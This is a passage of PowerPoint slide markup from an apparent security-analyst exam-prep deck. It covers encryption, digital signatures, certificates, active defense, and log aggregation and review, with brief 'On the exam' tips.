              <a:t>–  Threat protection – detects and blocks malicious activity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Compliance – controls to adhere to regulatory requirements</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Data security – controls to protect sensitive data</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ENCRYPTION AND ACTIVE DEFENSE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Encryption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Encryption is a mathematical technique that scrambles readable plaintext into unreadable ciphertext and can reverse the process to recover the plaintext with the correct key.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Symmetric encryption uses one shared secret (private) key for both encrypting and decrypting and is fast, making it suited to bulk data; asymmetric encryption uses a mathematically linked public and private key pair.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  In public-key (asymmetric) cryptography, data encrypted with one key of the pair can only be decrypted with the other, which enables secure key exchange, confidentiality, and the basis for digital signatures.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because encryption protects data at rest and in transit, but it also hides attacker traffic, so understanding both algorithms and key handling is essential for defense and detection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions contrasting symmetric vs asymmetric encryption by speed, key handling, and use case, and how the public/private key pair enables confidentiality.</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ENCRYPTION AND ACTIVE DEFENSE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Encryption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Mathematical technique to scramble text</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Converts plaintext into ciphertext</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Reversible (converts ciphertext into plaintext)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Types of encryption</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Symmetric (private key)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Asymmetric (public key)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Public-key cryptography (asymmetric encryption)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Uses two keys</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Public and private key pair</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  If you encrypt with one key, you can decrypt with the other</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ENCRYPTION AND ACTIVE DEFENSE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Digital Signature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A digital signature combines hashing and asymmetric encryption to prove the origin and integrity of a message or file.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A hash function takes input of any size and produces a unique fixed-length digest; the sender encrypts that digest with their private key, and the recipient verifies it using the sender's public key.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  If the recomputed hash matches the decrypted one, it confirms both that the sender holds the corresponding private key (authentication and non-repudiation) and that the content was not altered (integrity).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For a SOC, digital signatures underpin trust in code signing, secure email, and certificates, so signature validation failures can indicate tampering or spoofing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam tests that digital signatures provide integrity, authentication, and non-repudiation by signing a hash with the sender's private key.</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ENCRYPTION AND ACTIVE DEFENSE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Digital Signature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Uses encryption</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Uses hashing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Mathematical function that take input and creates a unique fixed-length output</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Verifies the message sender</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ENCRYPTION AND ACTIVE DEFENSE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Certificate Management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A digital certificate binds the public key of a known identity to that identity and is issued and vouched for by a trusted entity called a certificate authority (CA), with trust as its foundation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Certificates follow the X.509 standard, which defines their contents such as the subject, issuer, public key, validity period, and serial number, enabling interoperable public key infrastructure (PKI).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Certificate management covers the full lifecycle: enrollment and issuance, renewal, revocation via CRL or OCSP, and secure storage of private keys.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because expired, misissued, self-signed, or revoked certificates break trust and are frequently abused in phishing, man-in-the-middle attacks, and malicious code signing.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions on X.509, the CA trust model, and revocation (CRL/OCSP), plus recognizing certificate errors as indicators of compromise.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ENCRYPTION AND ACTIVE DEFENSE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Certificate Management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Digital certificate</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Public key of a known identity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Stored by a trusted entity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Certificate authority</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Trusted entity that stores public keys of known identities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Trust is the foundation</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ENCRYPTION AND ACTIVE DEFENSE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Certificate Management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X.509</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  IEEE certificate standard</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Defines certificate contents</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Certificate management includes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Creation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Authenticating</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Storage (trusted)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Distribution</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Revocation</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ENCRYPTION AND ACTIVE DEFENSE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Active Defense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Active defense is a set of proactive techniques that make an organization a harder, less predictable target rather than a sitting one.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Moving Target Defense (MTD) continuously changes the attack surface, for example by rotating IP addresses, ports, or configurations, so reconnaissance data quickly becomes stale and less valuable to an attacker.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Honeypots and honeynets are decoy systems and networks deployed to lure, detect, and study adversaries, generating high-fidelity alerts because any interaction with them is inherently suspicious.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By using obfuscation and agility, active defense increases attacker cost and dwell-time risk while giving the SOC early, low-noise detection signals.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Know that active defense (MTD, honeypots/honeynets, deception) aims to disrupt reconnaissance and generate high-fidelity detection, not to hack back.</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ENCRYPTION AND ACTIVE DEFENSE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Active Defense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Avoid being a sitting target</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Moving Target Defense (MTD)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Change attack surface frequently to confuse attackers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Honeypots and honeynets</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Use obfuscation and agility</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Reduces value of reconnaissance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DATA ANALYTICS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Overview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g_02e4327d4d.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1243631" y="1783080"/>
            <a:ext cx="9701689" cy="4434840"/>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DATA ANALYTICS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Aggregation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Aggregation is the process of collecting log and event data from many disparate sources across the enterprise and centralizing it in one place, such as a log manager or the ingestion tier of a SIEM.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Sources include servers, endpoints, firewalls, IDS/IPS sensors, routers, switches, and applications, each producing records in different formats that a log manager normalizes and consolidates into a searchable store.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For a SOC analyst, aggregation is the foundation of monitoring because correlating an attack that spans multiple systems is impossible when logs remain siloed on individual hosts, and centralization also protects the evidence trail if an attacker wipes local logs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions asking which capability collects logs from multiple sources into a single repository to enable correlation, distinguishing aggregation from correlation, parsing, and normalization.</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DATA ANALYTICS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Aggregation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Sources</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Log managers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DATA ANALYTICS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Kibana Demo</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g_d2ec6d669c.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2203531" y="1783080"/>
            <a:ext cx="7781889" cy="4434840"/>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62</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DATA ANALYTICS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Analytics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Analytics applies statistical and behavioral techniques to aggregated data to surface meaningful patterns, and it depends on first establishing a baseline of normal activity so that abnormal activity can be measured against it.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Trend analysis examines how metrics move over time to spot gradual shifts, while historical analysis uses recorded past behavior to give context to a current event and confirm whether it is genuinely anomalous.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The core goal is detecting deviations from the baseline, because most attacks manifest as behavior that differs from the established norm, and a spike or drift away from expected values is a strong indicator of compromise.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts rely on analytics to move from raw data to informed defensive decisions, prioritizing which alerts warrant investigation rather than reacting to every log line.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam tests that a baseline is a prerequisite for detecting anomalies and that trend and historical analysis are used to identify deviations that inform defensive action.</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63</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DATA ANALYTICS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Analytics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Trend analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Baseline required</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Looking for deviations from baselines</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Historical analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Past behavior used to gain perspective</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Make informed decisions for defense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64</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DATA ANALYTICS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Manual Review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Manual review is the analyst-driven inspection of raw log data by hand, reading through records such as firewall logs, authentication logs, Windows event logs, and Unix/Linux syslogs to find indicators automated tooling may have missed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Firewall logs reveal allowed and denied connections, authentication logs expose failed and successful logon attempts and possible brute-force or credential-stuffing activity, and event and syslog entries capture system and application behavior that supports timeline reconstruction.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Although slow and not scalable to high volumes, manual review remains essential during deep investigations and threat hunting because a skilled analyst can recognize context and subtle attacker tradecraft that signature-based rules do not flag.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Questions frame manual review as the go-to technique for detailed investigation of specific log types when automated correlation is insufficient, and test recognition of which log source contains a given piece of evidence.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65</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DATA ANALYTICS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Manual Review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Firewall logs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
